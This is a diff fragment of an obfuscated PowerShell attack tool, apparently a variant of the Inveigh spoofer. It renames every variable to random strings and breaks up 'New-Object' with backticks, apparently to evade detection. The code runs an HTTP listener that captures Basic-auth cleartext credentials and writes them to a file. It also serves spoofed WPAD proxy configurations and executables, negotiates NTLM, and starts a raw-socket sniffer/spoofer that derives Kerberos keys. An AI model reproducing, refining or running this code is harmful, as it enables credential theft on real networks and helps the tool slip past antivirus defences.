+                $gGpIjkAKzuIRfHQszHDb = 0x32,0x30,0x30
+                $oeKzIwvAvNinvZrKsunpMXBeTjWBFvXvxavRSIJpSj = 0x4f,0x4b
+                $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD = $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD -replace 'Basic ',''
+                $ThpvvpDeksxcEXkRTAYmWjfhc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD))
+                $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac = $true
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_file_queue.Add($ThpvvpDeksxcEXkRTAYmWjfhc) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list.Add($ThpvvpDeksxcEXkRTAYmWjfhc) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) Basic authentication cleartext credentials captured from $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF`:") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add($ThpvvpDeksxcEXkRTAYmWjfhc) > $null
 
-                if($LightOval.file_output)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output)
                 {
-                    $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $FlagBolt($LunchCheat) Basic authentication cleartext credentials written to " + "Inveigh-AskEffect.txt") > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) Basic authentication cleartext credentials written to " + "Inveigh-AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF.txt") > $null
                 }
                  
             }
 
-            if(($StewGun -notmatch '/wpad.dat' -and $SkirtStone -eq 'Anonymous') -or ($StewGun -match '/wpad.dat' -and $LoadTrade -eq 'Anonymous') -or (
-            $RobustFail.Count -gt 0 -and $LoadTrade -like 'NTLM*' -and ($RobustFail | Where-Object {$LovelyMother -match $_})) -or $DesireUnused)
+            if(($RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -notmatch '/wpad.dat' -and $SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP -eq 'Anonymous') -or ($RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat' -and $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -eq 'Anonymous') -or (
+            $LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc.Count -gt 0 -and $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -like 'NTLM*' -and ($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc | Where-Object {$gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF -match $_})) -or $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac)
             {
 
-                if($YummyShame -and $BadgeKind -and $StewGun -like '*.exe' -and (Test-Path (Join-Path $YummyShame $BadgeKind)) -and !(Test-Path (Join-Path $YummyShame $StewGun)))
+                if($MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR -and $mxyeWmucysuQaCQWfngETzsqqbNiqa -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -like '*.exe' -and (Test-Path (Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $mxyeWmucysuQaCQWfngETzsqqbNiqa)) -and !(Test-Path (Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi)))
                 {
-                    [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $BadgeKind))
-                    $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: application/exe")
+                    [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.IO.File]::ReadAllBytes((Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $mxyeWmucysuQaCQWfngETzsqqbNiqa))
+                    $HtNVJATiHbEfXTHEWmPbh = [System.Text.Encoding]::UTF8.GetBytes("Content-NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa: application/exe")
                 }
-                elseif($YummyShame)
+                elseif($MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR)
                 {
 
-                    if($StewLean -and !(Test-Path (Join-Path $YummyShame $StewGun)) -and (Test-Path (Join-Path $YummyShame $StewLean)) -and $StewGun -notmatch '/wpad.dat')
+                    if($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl -and !(Test-Path (Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi)) -and (Test-Path (Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl)) -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -notmatch '/wpad.dat')
                     {
-                        [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $StewLean))
+                        [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.IO.File]::ReadAllBytes((Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl))
                     }
-                    elseif(($StewLean -and $StewGun -eq '' -or $StewLean -and $StewGun -eq '/') -and (Test-Path (Join-Path $YummyShame $StewLean)))
+                    elseif(($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -eq '' -or $lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -eq '/') -and (Test-Path (Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl)))
                     {
-                        [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $StewLean))
+                        [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.IO.File]::ReadAllBytes((Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl))
                     }
-                    elseif($ReasonTrust -and $StewGun -match '/wpad.dat')
+                    elseif($aWWNkGgRqzQWHhdZkUzqbTdql -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat')
                     {
-                        [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($ReasonTrust)
-                        $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: application/x-ns-JumpyWrench-autoconfig")
+                        [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.Text.Encoding]::UTF8.GetBytes($aWWNkGgRqzQWHhdZkUzqbTdql)
+                        $HtNVJATiHbEfXTHEWmPbh = [System.Text.Encoding]::UTF8.GetBytes("Content-NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa: application/x-ns-QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB-autoconfig")
                     }
                     else
                     {
 
-                        if(Test-Path (Join-Path $YummyShame $StewGun))
+                        if(Test-Path (Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi))
                         {
-                            [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $StewGun))
+                            [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.IO.File]::ReadAllBytes((Join-Path $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi))
                         }
                         else
                         {
-                            [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($YawnOdd)
+                            [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.Text.Encoding]::UTF8.GetBytes($obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE)
                         }
             
                     }
@@ -3667,103 +3667,103 @@ $SwimChief =
                 else
                 {
                 
-                    if($ReasonTrust -and $StewGun -match '/wpad.dat' -and (!$ExpandNest -or !($ExpandNest | Where-Object {$LovelyMother -match $_})))
+                    if($aWWNkGgRqzQWHhdZkUzqbTdql -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat' -and (!$eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR -or !($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR | Where-Object {$gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF -match $_})))
                     {
-                        $TankChange = $ReasonTrust
-                        $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: application/x-ns-JumpyWrench-autoconfig")
+                        $eEhgsNlsHUqPfVwNBRythnTcVzbWdimOVL = $aWWNkGgRqzQWHhdZkUzqbTdql
+                        $HtNVJATiHbEfXTHEWmPbh = [System.Text.Encoding]::UTF8.GetBytes("Content-NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa: application/x-ns-QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB-autoconfig")
                     }
-                    elseif($YawnOdd)
+                    elseif($obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE)
                     {
-                        $TankChange = $YawnOdd
+                        $eEhgsNlsHUqPfVwNBRythnTcVzbWdimOVL = $obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE
                         
-                        if($SwingHorses)
+                        if($GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS)
                         {
-                            $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: $SwingHorses")
+                            $HtNVJATiHbEfXTHEWmPbh = [System.Text.Encoding]::UTF8.GetBytes("Content-NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa: $GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS")
                         }
 
                     }
 
-                    [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($TankChange)
+                    [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.Text.Encoding]::UTF8.GetBytes($eEhgsNlsHUqPfVwNBRythnTcVzbWdimOVL)
                 }
 
             }
             else
             {
-                [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($TankChange)
+                [Byte[]]$YIfDkNPTeizpGYSrmXglpikCweXdNsig = [System.Text.Encoding]::UTF8.GetBytes($eEhgsNlsHUqPfVwNBRythnTcVzbWdimOVL)
             }
 
-            $SmellyWish = Get-Date -format r
-            $SmellyWish = [System.Text.Encoding]::UTF8.GetBytes($SmellyWish)
+            $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc = Get-Date -format r
+            $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc = [System.Text.Encoding]::UTF8.GetBytes($VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc)
 
-            if(($SkirtStone -like 'NTLM*' -and $StewGun -notmatch '/wpad.dat') -or ($LoadTrade -like 'NTLM*' -and $StewGun -match '/wpad.dat') -and !$DesireUnused)
+            if(($SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP -like 'NTLM*' -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -notmatch '/wpad.dat') -or ($QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -like 'NTLM*' -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat') -and !$ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac)
             {
 
-                if($HeapDetect -eq 'Y' -and ($OrangeDog.Count -gt 0 -and $OrangeDog -contains $PartPlucky))
+                if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y' -and ($jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC.Count -gt 0 -and $jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC -contains $RccpaskStAKspwngsFTkmEZLUtqlhaHyRv))
                 {
-                    $JadedWound = [System.Text.Encoding]::UTF8.GetBytes("Negotiate")
+                    $CXSXdNNjFyAsifHnnAqorIFhlI = [System.Text.Encoding]::UTF8.GetBytes("Negotiate")
                 }
                 else
                 {
-                    $JadedWound = [System.Text.Encoding]::UTF8.GetBytes($WindBone)
+                    $CXSXdNNjFyAsifHnnAqorIFhlI = [System.Text.Encoding]::UTF8.GetBytes($HYnEGzASViuUJzNoQskddNggVbRoI)
                 }
                 
             }
-            elseif(($SkirtStone -eq 'Basic' -and $StewGun -notmatch '/wpad.dat') -or ($LoadTrade -eq 'Basic' -and $StewGun -match '/wpad.dat'))
+            elseif(($SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP -eq 'Basic' -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -notmatch '/wpad.dat') -or ($QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -eq 'Basic' -and $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat'))
             {
-                $JadedWound = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$SuperbBlood")
+                $CXSXdNNjFyAsifHnnAqorIFhlI = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY")
             }
             
-            $OvalKnown = ne`w-`obje`ct System.Collections.Specialized.OrderedDictionary
-            $OvalKnown.Add("HTTPResponse_ResponseVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
-            $OvalKnown.Add("HTTPResponse_StatusCode",$NearVoice + [Byte[]](0x20))
-            $OvalKnown.Add("HTTPResponse_ResponsePhrase",$FloatHarbor + [Byte[]](0x0d,0x0a))
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS = ne`w`-`ob`je`ct System.Collections.Specialized.OrderedDictionary
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_ResponseVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_StatusCode",$gGpIjkAKzuIRfHQszHDb + [Byte[]](0x20))
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_ResponsePhrase",$oeKzIwvAvNinvZrKsunpMXBeTjWBFvXvxavRSIJpSj + [Byte[]](0x0d,0x0a))
 
-            if($SaveJuggle)
+            if($FyrcUKtqiRjGEsgGrhOBOXPYrMvFi)
             {
-                $EyesMarble = [System.Text.Encoding]::UTF8.GetBytes("Connection: close")
-                $OvalKnown.Add("HTTPResponse_Connection",$EyesMarble + [Byte[]](0x0d,0x0a))
+                $WZeByXTjBpMTHPsxwZxdHOcRRFIfzghUCmwFvQkIA = [System.Text.Encoding]::UTF8.GetBytes("Connection: close")
+                $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_Connection",$WZeByXTjBpMTHPsxwZxdHOcRRFIfzghUCmwFvQkIA + [Byte[]](0x0d,0x0a))
             }
 
-            $OvalKnown.Add("HTTPResponse_Server",[System.Text.Encoding]::UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0") + [Byte[]](0x0d,0x0a))
-            $OvalKnown.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $SmellyWish + [Byte[]](0x0d,0x0a))
-            $OvalKnown.Add("HTTPResponse_ContentLength",[System.Text.Encoding]::UTF8.GetBytes("Content-PlaceBook: $($RunFire.Length)") + [Byte[]](0x0d,0x0a))
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_Server",[System.Text.Encoding]::UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0") + [Byte[]](0x0d,0x0a))
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc + [Byte[]](0x0d,0x0a))
+            $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_ContentLength",[System.Text.Encoding]::UTF8.GetBytes("Content-GDrWuJgEKDiRKaJZfsVrNpYQc: $($YIfDkNPTeizpGYSrmXglpikCweXdNsig.Length)") + [Byte[]](0x0d,0x0a))
 
-            if($CoatAttend -and $JadedWound)
+            if($MPzYiQhaPJyyjamwcmaRjzP -and $CXSXdNNjFyAsifHnnAqorIFhlI)
             {
-                $OvalKnown.Add("HTTPResponse_AuthenticateHeader",$CoatAttend + $JadedWound + [Byte[]](0x0d,0x0a))
+                $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_AuthenticateHeader",$MPzYiQhaPJyyjamwcmaRjzP + $CXSXdNNjFyAsifHnnAqorIFhlI + [Byte[]](0x0d,0x0a))
             }
 
-            if($SturdyPinch)
+            if($HtNVJATiHbEfXTHEWmPbh)
             {
-                $OvalKnown.Add("HTTPResponse_ContentType",$SturdyPinch + [Byte[]](0x0d,0x0a))
+                $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_ContentType",$HtNVJATiHbEfXTHEWmPbh + [Byte[]](0x0d,0x0a))
             }
 
-            if($MonthRare)
+            if($MpgtsHdqCNZyDGvEjyzaQSRzRAzhibxeZdRHZkzmwcMk)
             {
-                $OvalKnown.Add("HTTPResponse_CacheControl",$MonthRare + [Byte[]](0x0d,0x0a))
+                $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_CacheControl",$MpgtsHdqCNZyDGvEjyzaQSRzRAzhibxeZdRHZkzmwcMk + [Byte[]](0x0d,0x0a))
             }
 
-            if($LipSmall)
+            if($uYDwAMTYtBFOnonLzkvudmxMlvj)
             {
-                $OvalKnown.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $RunFire)
-                $PressSize = ConvertFrom-PacketOrderedDictionary $OvalKnown
-                $GrateSpicy.Write($PressSize,0,$PressSize.Length)
-                $GrateSpicy.Flush()
+                $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $YIfDkNPTeizpGYSrmXglpikCweXdNsig)
+                $sfnoxmLNXvjWoObbdksLiTrJUKVIijINFI = ConvertFrom-PacketOrderedDictionary $AvHFYcZAlhkNqOqiweqvhCigRFUIJuXrVZS
+                $gtWJOTknRyHoQUPpqdcgydUMysQll.Write($sfnoxmLNXvjWoObbdksLiTrJUKVIijINFI,0,$sfnoxmLNXvjWoObbdksLiTrJUKVIijINFI.Length)
+                $gtWJOTknRyHoQUPpqdcgydUMysQll.Flush()
             }
 
             Start-Sleep -m 10
-            $FruitBridge = $StewGun
+            $gpWhWDWUsdNZYwHULyhboSHfGSOaFFzwjoEDasoqVt = $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi
 
-            if($DesireUnused)
+            if($ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac)
             {
                 
-                if($SufferRefuse)
+                if($ZCWCfsgrcLUlJogmhFPdzZOB)
                 {
-                    $SnatchStamp.Client.Close()
+                    $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.Close()
                 }
                 else
                 {
-                    $SnatchStamp.Close()
+                    $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Close()
                 }
 
             }
@@ -3772,20 +3772,20 @@ $SwimChief =
         else
         {
 
-            if($QuackTickle -eq $SnatchStamp.Client.Handle)
+            if($szPvEgzDwvzLSORtknunBQhQWPRkalfptseoZAmxTtHaT -eq $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.Handle)
             {
-                $MiddleHalf++
+                $MMXZjyiYpCxhBGOqIuyqqtUedgM++
             }
             else
             {
-                $MiddleHalf = 0
+                $MMXZjyiYpCxhBGOqIuyqqtUedgM = 0
             }
 
-            if($SaveJuggle -or $MiddleHalf -gt 20)
+            if($FyrcUKtqiRjGEsgGrhOBOXPYrMvFi -or $MMXZjyiYpCxhBGOqIuyqqtUedgM -gt 20)
             {
                 
-                $SnatchStamp.Close()
-                $MiddleHalf = 0
+                $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Close()
+                $MMXZjyiYpCxhBGOqIuyqqtUedgM = 0
             }
             else
             {
@@ -3796,93 +3796,93 @@ $SwimChief =
     
     }
 
-    $SnatchStamp.Close()
-    $DropLamp.Stop()
+    $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Close()
+    $QGILpbVZZGqLibvSoTsqThCOXZNYzJ.Stop()
 }
 
 # Microsoft".
-$InnatePrefer = 
+$dfKYZGwoOCUxIEtzUcKsIGxqsdoGmTTMfAoTd = 
 {
-    param ($HomelyShow,$HandsHop,$BootShrill,$MeekSmoggy,$SmashDolls,$HeapDetect,$KindLick,$MilkyCelery,$LearnHelp,$LipMeat,
-            $TeaseNasty,$BoilClever,$WantLittle,$MurderOffer,$PeckFirst,$BlushCattle,$ThawMiddle,$SilkySmelly,$SlimyCable,
-            $BreezyDesign,$FairAblaze,$NorthAmuck,$HoleRoute,$BikeLoud,$StickLame,
-            $ObeyAttack,$WoozyClose,$PlugTour,$SmokeFang,$WrongAnts,
-            $JokeFaulty,$OwnBump,$SameSneaky)
+    param ($tPEylzZKZOmcrNuZqaNvxfEfrUAkL,$uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl,$aIowrpuHkOxENKSShZvEwCIJzxVgFyNLYKmALixgLNWyk,$ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn,$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS,$fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn,$JoXWcoXEYHNGuWREHpaUFbcXY,$MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho,$HmzaQTfoETMMBLLoFthmsnPeudAqyQhk,$PFkUZTrIToIoyXaKEeXORSPy,
+            $UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD,$QdOGoORVrhoEArPgHPqrqy,$oiEknJevzfgMBjSqYIpc,$LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk,$FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO,$fgjekbNhYQKGsQdqOkUhuYvojUQK,$XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ,$NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV,$QXplYkjxeRFAgTbHwoZGdRyj,
+            $xiTnjmjZESCjsSHBdSaGp,$NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo,$UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB,$fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo,$EPlJedBuToZfupQVQRyNJcsGRdsiyc,$zkTvnUBoWamaHbrMDvklWqGBdwC,
+            $GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg,$swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe,$LPmXJzyXqTgdUoElyxFCYzOJzqmSu,$TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY,$eEmdEINEKedVTvUFZHbuolOJMVn,
+            $iNyWtiQGdKJEvnLZUaOj,$wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz,$DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC)
 
-    $FixPowder = $true
-    $byte_in = ne`w-`obje`ct System.Byte[] 4	
-    $byte_out = ne`w-`obje`ct System.Byte[] 4	
-    $byte_data = ne`w-`obje`ct System.Byte[] 65534
+    $yKxKGyrFSNBveiCOgkAkKLepuOJSnGEOoglXoczDsor = $true
+    $byte_in = ne`w`-`ob`je`ct System.Byte[] 4	
+    $byte_out = ne`w`-`ob`je`ct System.Byte[] 4	
+    $byte_data = ne`w`-`ob`je`ct System.Byte[] 65534
     $byte_in[0] = 1
     $byte_in[1-3] = 0
     $byte_out[0] = 1
     $byte_out[1-3] = 0
-    $GroanDress = ne`w-`obje`ct System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
-    $GroanDress.SetSocketOption("IP","HeaderIncluded",$true)
-    $GroanDress.ReceiveBufferSize = 65534
+    $dNEeFjOSSAqzEtXXByEFDclXxXe = ne`w`-`ob`je`ct System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
+    $dNEeFjOSSAqzEtXXByEFDclXxXe.SetSocketOption("IP","HeaderIncluded",$true)
+    $dNEeFjOSSAqzEtXXByEFDclXxXe.ReceiveBufferSize = 65534
 
-    if($HeapDetect -eq 'Y')
+    if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y')
     {
 
-        if($LearnHelp)
+        if($HmzaQTfoETMMBLLoFthmsnPeudAqyQhk)
         {
-            $YummyCrowd = (&{for ($ColorReply = 0;$ColorReply -lt $LearnHelp.Length;$ColorReply += 2){$LearnHelp.SubString($ColorReply,2)}}) -join "-"
-            $YummyCrowd = $YummyCrowd.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq = (&{for ($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $HmzaQTfoETMMBLLoFthmsnPeudAqyQhk.Length;$vfvDllDKJdYKKWFSzYEB += 2){$HmzaQTfoETMMBLLoFthmsnPeudAqyQhk.SubString($vfvDllDKJdYKKWFSzYEB,2)}}) -join "-"
+            $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq = $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         }
-        elseif($MilkyCelery)
+        elseif($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho)
         {
-            $YummyCrowd = Get-KerberosAES256BaseKey ($MilkyCelery.UserName).Trim("\") $MilkyCelery.Password
+            $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq = Get-KerberosAES256BaseKey ($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho.UserName).Trim("\") $MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho.Password
         }
 
     }
 
     try
     {
-        $WealthSecond = ne`w-`obje`ct System.Net.IPEndpoint([System.Net.IPAddress]"$SmashDolls",0)
+        $kELpxOhdDtqIuBGwKgUdkeqHACHZxUSKgkbHsussadj = ne`w`-`ob`je`ct System.Net.IPEndpoint([System.Net.IPAddress]"$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS",0)
     }
     catch
     {
-        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
         $error_message = $_.Exception.Message
         $error_message = $error_message -replace "`n",""
-        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-        $FixPowder = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $yKxKGyrFSNBveiCOgkAkKLepuOJSnGEOoglXoczDsor = $false
     }
 
-    $GroanDress.Bind($WealthSecond)
-    $GroanDress.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
-    $TailCharge = [System.BitConverter]::GetBytes($HandsHop)
-    [Array]::Reverse($TailCharge)
-    $CheapSuperb = [System.BitConverter]::GetBytes($TeaseNasty)
-    [Array]::Reverse($CheapSuperb)
-    $PourDesign = [System.BitConverter]::GetBytes($MurderOffer)
-    [Array]::Reverse($PourDesign)
-    $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
-    [Array]::Reverse($BaitWound)
-    $BaseNumber = ne`w-`obje`ct System.Collections.Generic.List[string]
-    $AbruptWorm = ne`w-`obje`ct System.Collections.Generic.List[string]
